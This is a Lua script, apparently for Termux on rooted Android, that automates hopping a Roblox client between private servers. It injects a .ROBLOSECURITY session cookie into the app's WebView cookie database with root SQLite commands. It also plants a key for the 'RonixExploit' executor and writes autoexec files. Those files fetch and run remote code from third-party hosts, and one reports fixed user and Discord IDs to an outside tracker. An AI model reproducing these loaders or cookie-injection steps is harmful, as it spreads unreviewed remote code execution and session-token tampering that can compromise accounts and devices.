-- Simple PS Hopper v1.4
-- Single package | Menu-based | sleep-based loop
-- Target: Termux + Root Android
-- Cookie inject: SQLite WebView Default/Cookies
-- ============================================

local HOPPER_LOG  = "/sdcard/hopper_log.txt"
local PS_FILE     = os.getenv("HOME") .. "/private_servers.txt"
local PKG_FILE    = os.getenv("HOME") .. "/.hopper_pkg"
local COOKIE_FILE = os.getenv("HOME") .. "/.hopper_cookie"
local STOP_FILE   = os.getenv("HOME") .. "/.hopper_stop"
local INJECT_SH   = "/sdcard/.hopper_inject.sh"

local SQLITE3 = "/data/data/com.termux/files/usr/bin/sqlite3"

local RONIX_KEY_DIR  = "/storage/emulated/0/RonixExploit/internal/"
local RONIX_KEY_PATH = RONIX_KEY_DIR .. "_key.txt"
local RONIX_KEY_VAL  = "LzuYkZDBBIkVTMHEBAJGxZwqycRUimlL"
local RONIX_AE_DIR   = "/storage/emulated/0/RonixExploit/autoexec/"
local RONIX_AE_PATH  = RONIX_AE_DIR .. "Accept.lua"
local RONIX_AE_SCRIPT = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/Fluxyyy333/Auto-Rebirth-speed/refs/heads/main/jgndiambilbg"))()
getgenv().scriptkey="HsMgJbFoUwmvfzGxLESxMiUFuYpyqfFA"
loadstring(game:HttpGet("https://zekehub.com/scripts/AdoptMe/Utility.lua"))()]]

local RONIX_TRACK_PATH   = RONIX_AE_DIR .. "Trackstat.lua"
local RONIX_TRACK_SCRIPT = '_G.Config={UserID="37825915-c3be-41bc-987f-661da09d9b3c",discord_id="757533465213141053",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/adoptmee"))()end)if s then break end wait(5)end'

local PKG     = ""
local HOP_MIN = 0

-- ============================================
-- HELPERS
-- ============================================
local function sleep(s)
    if s and s > 0 then os.execute("sleep " .. tostring(s)) end
end

local function su_exec(cmd)
    os.execute("su -c '" .. cmd:gsub("'", "'\\''") .. "' >/dev/null 2>&1")
end

local function log(msg)
    local f = io.open(HOPPER_LOG, "a")
    if f then f:write(os.date("[%H:%M:%S] ") .. msg .. "\n"); f:close() end
end

local function cls()
    io.write("\27[2J\27[3J\27[H\27[0m"); io.flush()
end

local function ask(prompt)
    io.write(prompt .. " > "); io.flush()
    local tty = io.open("/dev/tty", "r")
    local r
    if tty then r = tty:read("*l"); tty:close()
    else r = io.read("*l") end
    return r and r:gsub("^%s+", ""):gsub("%s+$", "") or ""
end

local function file_exists(path)
    local f = io.open(path, "r")
    if f then f:close(); return true end
    return false
end

local function save_file(path, content)
    local f = io.open(path, "w")
    if f then f:write(content); f:close() end
end

local function read_file(path)
    local f = io.open(path, "r")
    if not f then return "" end
    local c = f:read("*a") or ""; f:close()
    return c:gsub("^%s+", ""):gsub("%s+$", "")
end

local function load_ps()
    local f = io.open(PS_FILE, "r")
    if not f then return {} end
    local list = {}
    for line in f:lines() do
        local l = line:gsub("%c", ""):gsub("^%s+", ""):gsub("%s+$", "")
        if l ~= "" and not l:match("^#")
            and l:match("^https?://")
            and l:lower():match("code=") then
            table.insert(list, l)
        end
    end
    f:close()
    return list
end

local function tail_log(n)
    local lines = {}
    local f = io.open(HOPPER_LOG, "r")
    if not f then return {} end
    for line in f:lines() do table.insert(lines, line) end
    f:close()
    local out = {}
    local s = math.max(1, #lines - n + 1)
    for i = s, #lines do table.insert(out, lines[i]) end
    return out
end

-- ============================================
-- CORE
-- ============================================
local function is_running()
    if PKG == "" then return false end
    local h = io.popen("su -c 'pidof " .. PKG .. "' 2>/dev/null")
    if not h then return false end
    local r = h:read("*a") or ""; h:close()
    return r:match("%d+") ~= nil
end

-- ============================================
-- INJECT COOKIE — SQLite WebView
-- ============================================
local function inject_cookie()
    local cookie = read_file(COOKIE_FILE)
    if cookie == "" or PKG == "" then
        log("inject_cookie: skip (cookie atau PKG kosong)")
        return
    end

    local db = "/data/data/" .. PKG .. "/app_webview/Default/Cookies"

    -- Tulis cookie ke file sementara supaya tidak ada masalah quoting
    local ck_tmp = "/sdcard/.hopper_ck_tmp"
    local fc = io.open(ck_tmp, "w")
    if not fc then log("ERR: gagal tulis cookie tmp"); return end
    fc:write(cookie)
    fc:close()

    -- Buat shell script inject
    local f = io.open(INJECT_SH, "w")
    if not f then log("ERR: gagal tulis inject.sh"); return end
    f:write("#!/bin/sh\n")
    f:write("SQ='" .. SQLITE3 .. "'\n")
    f:write("DB='" .. db .. "'\n")
    f:write("COOKIE=$(cat '" .. ck_tmp .. "')\n")
    f:write("NOW=$(date +%s)\n")
    f:write("CHROME_NOW=$(( (NOW + 11644473600) * 1000000 ))\n")
    f:write("EXPIRE=$(( (NOW + 86400 * 365 + 11644473600) * 1000000 ))\n")
    f:write("$SQ \"$DB\" \"INSERT OR REPLACE INTO cookies (\n")
    f:write("  creation_utc, top_frame_site_key, host_key, name, value,\n")
    f:write("  encrypted_value, path, expires_utc, is_secure, is_httponly,\n")
    f:write("  last_access_utc, has_expires, is_persistent, priority,\n")
    f:write("  samesite, source_scheme, source_port, is_same_party\n")
    f:write(") VALUES (\n")
    f:write("  $CHROME_NOW, '', '.roblox.com', '.ROBLOSECURITY', '$COOKIE',\n")
    f:write("  '', '/', $EXPIRE, 1, 1,\n")
    f:write("  $CHROME_NOW, 1, 1, 1, -1, 1, 443, 0\n")
    f:write(");\"\n")
    -- Verifikasi
    f:write("RESULT=$($SQ \"$DB\" \"SELECT substr(value,1,20) FROM cookies WHERE name='.ROBLOSECURITY';\")\n")
    f:write("echo \"INJECT_RESULT:$RESULT\"\n")
    f:close()

    -- Jalankan via su
    local h = io.popen("su -c 'sh " .. INJECT_SH .. "' 2>&1")
    local result = h and h:read("*a") or ""
    if h then h:close() end

    -- Bersihkan
    os.remove(INJECT_SH)
    os.remove(ck_tmp)

    if result:match("INJECT_RESULT:_|WARNING") then
        log("Cookie injected OK via SQLite")
    else
        log("ERR inject cookie: " .. result:sub(1, 60))
    end
end

local function inject_key()
    su_exec("mkdir -p '" .. RONIX_KEY_DIR .. "'")
    local f = io.open(RONIX_KEY_PATH, "w")
    if f then f:write(RONIX_KEY_VAL); f:close() end
    log("Key injected")
end

local function inject_autoexec()
    su_exec("mkdir -p '" .. RONIX_AE_DIR .. "'")
    local f = io.open(RONIX_AE_PATH, "w")
    if f then f:write(RONIX_AE_SCRIPT); f:close() end
    log("Autoexec injected")
end

local function inject_trackstat()
    su_exec("mkdir -p '" .. RONIX_AE_DIR .. "'")
    local f = io.open(RONIX_TRACK_PATH, "w")
    if f then f:write(RONIX_TRACK_SCRIPT); f:close() end
    log("Trackstat injected")
end

-- Inject semua — dipanggil sekali saat start
local function inject_all()
    inject_cookie()
    inject_key()
    inject_autoexec()
    inject_trackstat()
end

local function launch(ps_link, ps_idx, ps_total)
    log(string.format("Launching PS %d/%d", ps_idx, ps_total))

    -- Force stop dulu
    su_exec("am force-stop " .. PKG)
    sleep(2)

    -- Inject cookie SETELAH force-stop
    inject_cookie()
    sleep(1)

    -- Build intent dari PS link
    local dp = ps_link:match("^intent://(.-)#Intent") or ps_link:gsub("^https?://", "")
    local intent = "intent://" .. dp
        .. "#Intent;scheme=https;package=" .. PKG
        .. ";action=android.intent.action.VIEW;end"
    su_exec('am start --user 0 "' .. intent .. '"')

    log(string.format("Launched PS %d/%d", ps_idx, ps_total))
end

-- ============================================
-- MONITOR DISPLAY
-- ============================================
local function show_status(cur_ps, ps_total, crash_count,
                            runtime_m, hop_elapsed_m, status_str)
    cls()
    print("========================")
    print("   HOPPER MONITOR v1.4  ")
    print("========================")
    print("")
    print("Pkg    : " .. PKG)
    print(string.format("PS     : %d / %d", cur_ps, ps_total))
    print("Status : " .. status_str)
    print("Crash  : " .. crash_count)
    print(string.format("Runtime: %dm", runtime_m))
    if HOP_MIN > 0 then
        print(string.format("Hop    : %dm / %dm", hop_elapsed_m, HOP_MIN))
    else
        print("Hop    : OFF")
    end
    print("")
    print("--- Log ---")
    for _, line in ipairs(tail_log(4)) do
        print(line)
    end
    print("")
    print("========================")
    print("Ketik [q] + Enter untuk STOP")
    print("========================")
end

-- ============================================
-- HOPPER LOOP
-- ============================================
local function run_hopper()
    local ps_list = load_ps()
    if #ps_list == 0 then
        print("[!] Tidak ada PS link!"); sleep(2); return
    end
    if PKG == "" then
        print("[!] Package belum diset!"); sleep(2); return
    end

    os.remove(STOP_FILE)
    os.execute("rm -f " .. HOPPER_LOG .. " 2>/dev/null")

    log("=== Hopper Started v1.4 ===")
    log("Pkg: " .. PKG .. " | PS: " .. #ps_list .. " | Hop: " .. HOP_MIN .. "m")

    local ptr         = 1
    local cur_ps      = 1
    local crash_count = 0
    local hop_sec     = HOP_MIN * 60
    local start_time  = os.time()
    local hop_time    = os.time()

    -- Inject key + autoexec sekali di awal
    log("Injecting key & autoexec...")
    inject_key()
    inject_autoexec()
    inject_trackstat()

    -- Launch pertama (termasuk inject cookie)
    launch(ps_list[ptr], ptr, #ps_list)
    cur_ps = ptr
    ptr = ptr + 1
    if ptr > #ps_list then ptr = 1 end

    while true do
        local h = io.popen("bash -c 'read -t 5 -r line < /dev/tty 2>/dev/null; echo \"$line\"' 2>/dev/null")
        local inp = ""
        if h then inp = h:read("*l") or ""; h:close() end
        inp = inp:gsub("%c", ""):gsub("^%s+", ""):gsub("%s+$", "")

        if inp:lower() == "q" then
            log("User stop")
            goto hopper_stop
        end
        if file_exists(STOP_FILE) then
            log("Stop file detected")
            goto hopper_stop
        end

        local now           = os.time()
        local runtime_m     = math.floor((now - start_time) / 60)
        local hop_elapsed_s = now - hop_time
        local hop_elapsed_m = math.floor(hop_elapsed_s / 60)
        local running       = is_running()
        local status_str    = running and "RUNNING" or "NOT RUNNING"

        -- Watchdog: crash
        if not running then
            crash_count = crash_count + 1
            log("Crash #" .. crash_count .. " relaunch PS " .. cur_ps)
            launch(ps_list[cur_ps], cur_ps, #ps_list)
            hop_time = os.time()
        end

        -- Hop timer
        if HOP_MIN > 0 and hop_elapsed_s >= hop_sec then
            log("Hop -> PS " .. ptr)
            launch(ps_list[ptr], ptr, #ps_list)
            cur_ps = ptr
            ptr = ptr + 1
            if ptr > #ps_list then ptr = 1 end
            hop_time = os.time()
            hop_elapsed_m = 0
        end

        -- Update display tiap ~60 detik
        local tick = math.floor((now - start_time) % 60)
        if tick < 5 then
            show_status(cur_ps, #ps_list, crash_count,
                        runtime_m, hop_elapsed_m, status_str)
        end
    end

    ::hopper_stop::
    os.remove(STOP_FILE)
    log("=== Hopper Stopped ===")
    show_status(cur_ps, #ps_list, crash_count, 0, 0, "STOPPED")
    print("")
end

-- ============================================
-- MENU HANDLERS
-- ============================================
local function menu_set_package()
    cls()
    print("=== SET PACKAGE ===")
    print("")
    local saved = read_file(PKG_FILE)
    if saved ~= "" then print("Tersimpan: " .. saved); print("") end

    local h = io.popen("pm list packages 2>/dev/null")
    local pkgs = {}
    if h then
        local r = h:read("*a") or ""; h:close()
        for line in r:gmatch("[^\r\n]+") do
            local p = line:match("package:(.+)")
            if p then
                p = p:gsub("%c", ""):gsub("^%s+", ""):gsub("%s+$", "")
                if p ~= "" then table.insert(pkgs, p) end
            end
        end
        table.sort(pkgs)
    end

    if #pkgs > 0 then
        print("Package tersedia:")
        for i, p in ipairs(pkgs) do
            print(string.format("  %d. %s", i, p))
        end
        print("")
    end

    local inp = ask("Nomor / nama (kosong=batal)")
    if inp == "" then return end
    local n = tonumber(inp)
    local new_pkg = (n and pkgs[n]) or inp
    if new_pkg and new_pkg ~= "" then
        PKG = new_pkg
        save_file(PKG_FILE, PKG)
        print("[+] Package: " .. PKG)
    else
        print("[!] Tidak valid")
    end
    sleep(1)
end

local function menu_set_cookie()
    cls()
    print("=== SET COOKIE ===")
    print("")
    local saved = read_file(COOKIE_FILE)
    if saved ~= "" then
        print("Tersimpan: " .. saved:sub(1, 20) .. "...")
        print("")
        local ch = ask("Ganti? (y/n)")
        if ch:lower() ~= "y" then return end
    end
    print("Paste .ROBLOSECURITY (kosong=batal):")
    print("")
    local raw = ask("")
    if raw == "" then print("Batal."); sleep(1); return end
    local ck = raw:match("(_|WARNING.+)$") or raw
    save_file(COOKIE_FILE, ck)
    os.execute("chmod 600 '" .. COOKIE_FILE .. "'")
    print("[+] Cookie disimpan.")
    sleep(1)
end

local function menu_set_ps()
    while true do
        cls()
        print("=== PS LINKS ===")
        print("")
        local ps = load_ps()
        if #ps == 0 then
            print("  (kosong)")
        else
            for i, l in ipairs(ps) do
                local d = #l > 42
                    and (l:sub(1, 25) .. "..." .. l:sub(-12))
                    or l
                print(string.format("  [%d] %s", i, d))
            end
        end
        print("")
        print("a=Tambah  d=Hapus  c=Clear  0=Kembali")
        print("")
        local opt = ask("")
        if opt == "0" or opt == "" then break

        elseif opt == "a" then
            print("Paste link (kosong=selesai):")
            local wf = io.open(PS_FILE, "a")
            local added = 0
            while true do
                local line = ask("")
                if line == "" then break end
                if line:match("^https?://") and line:lower():match("code=") then
                    if wf then wf:write(line .. "\n") end
                    added = added + 1
                    print("  [+] " .. added)
                else
                    print("  [!] Tidak valid")
                end
            end
            if wf then wf:close() end
            print(added .. " ditambahkan."); sleep(1)

        elseif opt == "d" then
            local ps2 = load_ps()
            if #ps2 == 0 then print("Kosong."); sleep(1)
            else
                local n = tonumber(ask("Hapus nomor"))
                if n and ps2[n] then
                    table.remove(ps2, n)
                    local wf = io.open(PS_FILE, "w")
                    if wf then
                        for _, l in ipairs(ps2) do wf:write(l .. "\n") end
                        wf:close()
                    end
                    print("[+] Dihapus."); sleep(1)
                else print("[!] Tidak valid"); sleep(1) end
            end

        elseif opt == "c" then
            if ask("Ketik 'hapus'") == "hapus" then
                save_file(PS_FILE, "")
                print("[+] Semua dihapus."); sleep(1)
            end
        end
    end
end

local function menu_set_hop()
    cls()
    print("=== SET HOP INTERVAL ===")
    print("")
    print("Saat ini: " .. (HOP_MIN == 0 and "OFF" or HOP_MIN .. "m"))
    print("")
    local inp = ask("Hop tiap berapa menit? (0=OFF)")
    local v = tonumber(inp)
    if v and v >= 0 then
        HOP_MIN = v
        print("[+] Hop: " .. (HOP_MIN == 0 and "OFF" or HOP_MIN .. "m"))
    else
        print("[!] Tidak valid")
    end
    sleep(1)
end

-- Test inject cookie tanpa launch
local function menu_test_inject()
    cls()
    print("=== TEST INJECT COOKIE ===")
    print("")
    if PKG == "" then
        print("[!] Set package dulu"); sleep(2); return
    end
    local cookie = read_file(COOKIE_FILE)
    if cookie == "" then
        print("[!] Set cookie dulu"); sleep(2); return
    end
    print("PKG    : " .. PKG)
    print("Cookie : " .. cookie:sub(1, 20) .. "...")
    print("")
    print("Menjalankan inject...")
    inject_cookie()
    print("")
    print("Cek log untuk hasil.")
    sleep(2)
end

-- ============================================
-- MAIN MENU
-- ============================================
local function main()
    PKG = read_file(PKG_FILE)

    while true do
        cls()
        print("=== SIMPLE HOPPER v1.4 ===")
        print("")
        local cookie = read_file(COOKIE_FILE)
        local ps     = load_ps()
        print("Package : " .. (PKG ~= "" and PKG or "-"))
        print("Cookie  : " .. (cookie ~= "" and cookie:sub(1, 16) .. "..." or "-"))
        print("PS      : " .. #ps)
        print("Hop     : " .. (HOP_MIN == 0 and "OFF" or HOP_MIN .. "m"))
        print("")
        print("1. Set package")
        print("2. Set cookie")
        print("3. Kelola PS links")
        print("4. Set hop interval")
        print("5. START")
        print("6. Test inject cookie")
        print("0. Keluar")
        print("")
        local ch = ask("Pilih")
        if     ch == "1" then menu_set_package()
        elseif ch == "2" then menu_set_cookie()
        elseif ch == "3" then menu_set_ps()
        elseif ch == "4" then menu_set_hop()
        elseif ch == "5" then run_hopper()
        elseif ch == "6" then menu_test_inject()
        elseif ch == "0" then cls(); print("Keluar."); break
        end
    end
end

-- ============================================
-- ENTRY
-- ============================================
cls()
main()
